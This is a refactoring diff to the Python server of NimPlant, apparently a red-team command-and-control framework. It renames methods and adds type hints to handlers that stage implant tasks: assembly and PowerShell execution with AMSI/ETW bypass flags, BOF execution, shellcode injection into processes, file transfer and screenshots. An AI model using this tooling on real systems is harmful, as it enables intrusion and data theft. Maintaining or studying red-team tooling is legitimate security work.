@@ -11,7 +11,7 @@ from datetime import datetime
 from struct import pack, calcsize
 from gzip import decompress
 from time import sleep
-from typing import Optional
+from typing import Optional, IO
 from zlib import compress
 
 from flask import Request
@@ -20,7 +20,7 @@ import server.util.commands as commands
 from server.util.config import config
 from server.util.crypto import encrypt_data
 from server.util.db import db_nimplant_log, db_server_log
-from server.util.nimplant import np_server
+from server.util.nimplant import np_server, NimPlant
 
 
 # Clear screen
@@ -172,7 +172,7 @@ def get_config_json():
 
 
 # Handle pre-processing for the 'execute-assembly' command
-def execute_assembly(np, args, raw_command):
+def execute_assembly(np: NimPlant, args, raw_command):
     # TODO: Make AMSI/ETW arg parsing more user-friendly
     amsi = "1"
     etw = "1"
@@ -210,7 +210,7 @@ def execute_assembly(np, args, raw_command):
         return
 
     assembly = compress(assembly, level=9)
-    assembly = encrypt_data(assembly, np.cryptKey)
+    assembly = encrypt_data(assembly, np.encryption_key)
     assembly_arguments = " ".join(args[k + 1 :])
 
     command = " ".join(
@@ -218,7 +218,7 @@ def execute_assembly(np, args, raw_command):
         for arg in ["execute-assembly", amsi, etw, assembly, assembly_arguments]
     )
 
-    guid = np.addTask(command, taskFriendly=raw_command)
+    guid = np.add_task(command, taskFriendly=raw_command)
     nimplant_print(
         "Staged execute-assembly command for NimPlant.", np.guid, task_guid=guid
     )
@@ -270,10 +270,10 @@ class BeaconPack:
 
 
 # Handle pre-processing for the 'inline-execute' command
-def inline_execute(np, args, raw_command):
+def inline_execute(np: NimPlant, args, raw_command):
     try:
         file = args[0]
-        entryPoint = args[1]
+        entry_point = args[1]
         assembly_arguments = list(args[2:])
     except:
         nimplant_print(
@@ -296,7 +296,7 @@ def inline_execute(np, args, raw_command):
         return
 
     assembly = compress(assembly, level=9)
-    assembly = encrypt_data(assembly, np.cryptKey)
+    assembly = encrypt_data(assembly, np.encryption_key)
 
     # Pre-process BOF arguments
     # Check if list of arguments consists of argument-type pairs
@@ -323,18 +323,18 @@ def inline_execute(np, args, raw_command):
         arg_pair_list = zip(assembly_arguments[::2], assembly_arguments[1::2])
         for arg_pair in arg_pair_list:
             arg = arg_pair[0]
-            argType = arg_pair[1]
+            argument_type = arg_pair[1]
 
             try:
-                if argType in args_binary:
+                if argument_type in args_binary:
                     buffer.addbin(arg)
-                elif argType in args_integer:
+                elif argument_type in args_integer:
                     buffer.addint(int(arg))
-                elif argType in args_short:
+                elif argument_type in args_short:
                     buffer.addshort(int(arg))
-                elif argType in args_string:
+                elif argument_type in args_string:
                     buffer.addstr(arg)
-                elif argType in args_wstring:
+                elif argument_type in args_wstring:
                     buffer.addWstr(arg)
                 else:
                     nimplant_print(
@@ -360,17 +360,17 @@ def inline_execute(np, args, raw_command):
 
     command = " ".join(
         shlex.quote(arg)
-        for arg in ["inline-execute", assembly, entryPoint, assembly_args_final]
+        for arg in ["inline-execute", assembly, entry_point, assembly_args_final]
     )
 
-    guid = np.addTask(command, taskFriendly=raw_command)
+    guid = np.add_task(command, taskFriendly=raw_command)
     nimplant_print(
         "Staged inline-execute command for NimPlant.", np.guid, task_guid=guid
     )
 
 
 # Handle pre-processing for the 'powershell' command
-def powershell(np, args, raw_command):
+def powershell(np: NimPlant, args, raw_command):
     amsi = "1"
     etw = "1"
 
@@ -397,12 +397,12 @@ def powershell(np, args, raw_command):
         shlex.quote(arg) for arg in ["powershell", amsi, etw, powershell_cmd]
     )
 
-    guid = np.addTask(command, taskFriendly=raw_command)
+    guid = np.add_task(command, taskFriendly=raw_command)
     nimplant_print("Staged powershell command for NimPlant.", np.guid, task_guid=guid)
 
 
 # Handle pre-processing for the 'shinject' command
-def shinject(np, args, raw_command):
+def shinject(np: NimPlant, args, raw_command):
     try:
         process_id, file_path = args[0:2]
     except:
@@ -418,13 +418,13 @@ def shinject(np, args, raw_command):
             shellcode = f.read()
 
         shellcode = compress(shellcode, level=9)
-        shellcode = encrypt_data(shellcode, np.cryptKey)
+        shellcode = encrypt_data(shellcode, np.encryption_key)
 
         command = " ".join(
             shlex.quote(arg) for arg in ["shinject", process_id, shellcode]
         )
 
-        guid = np.addTask(command, taskFriendly=raw_command)
+        guid = np.add_task(command, taskFriendly=raw_command)
         nimplant_print("Staged shinject command for NimPlant.", np.guid, task_guid=guid)
 
     else:
@@ -436,7 +436,7 @@ def shinject(np, args, raw_command):
 
 
 # Handle pre-processing for the 'upload' command
-def upload_file(np, args, raw_command):
+def upload_file(np: NimPlant, args, raw_command):
     if len(args) == 1:
         file_path = args[0]
         remote_path = ""
@@ -455,12 +455,12 @@ def upload_file(np, args, raw_command):
     file_id = hashlib.md5(file_path.encode("UTF-8")).hexdigest()
 
     if os.path.isfile(file_path):
-        np.hostFile(file_path)
+        np.host_file(file_path)
         command = " ".join(
             shlex.quote(arg) for arg in ["upload", file_id, file_name, remote_path]
         )
 
-        guid = np.addTask(command, taskFriendly=raw_command)
+        guid = np.add_task(command, taskFriendly=raw_command)
         nimplant_print("Staged upload command for NimPlant.", np.guid, task_guid=guid)
 
     else:
@@ -468,7 +468,7 @@ def upload_file(np, args, raw_command):
 
 
 # Handle pre-processing for the 'download' command
-def download_file(np, args, raw_command):
+def download_file(np: NimPlant, args, raw_command):
     if len(args) == 1:
         file_path = args[0]
         file_name = file_path.replace("/", "\\").split("\\")[-1]
@@ -487,16 +487,16 @@ def download_file(np, args, raw_command):
         return
 
     os.makedirs(os.path.dirname(local_path), exist_ok=True)
-    np.receiveFile(local_path)
+    np.receive_file(local_path)
     command = " ".join(shlex.quote(arg) for arg in ["download", file_path])
 
-    guid = np.addTask(command, taskFriendly=raw_command)
+    guid = np.add_task(command, taskFriendly=raw_command)
     nimplant_print("Staged download command for NimPlant.", np.guid, task_guid=guid)
 
 
 # Handle post-processing of the 'screenshot' command
 # This function is called based on the blob header b64(gzip(screenshot)), so we don't need to verify the format
-def process_screenshot(np, sc_blob) -> str:
+def process_screenshot(np: NimPlant, sc_blob) -> str:
     sc_blob = decompress(base64.b64decode(sc_blob))
 
     path = f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/screenshot_{timestamp(filename_safe=True)}.png"
@@ -509,7 +509,7 @@ def process_screenshot(np, sc_blob) -> str:
 
 # Get last lines of file
 # Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
-def tail(f, lines):
+def tail(f: IO[bytes], lines):
     block_size = 1024
     total_lines_wanted = lines
     f.seek(0, 2)
@@ -532,7 +532,7 @@ def tail(f, lines):
     return b"\n".join(all_read_text.splitlines()[-total_lines_wanted:])
 
 
-def tail_nimplant_log(np=None, lines=100):
+def tail_nimplant_log(np: NimPlant = None, lines=100):
     log_directory = os.path.abspath(
         os.path.join(
             os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
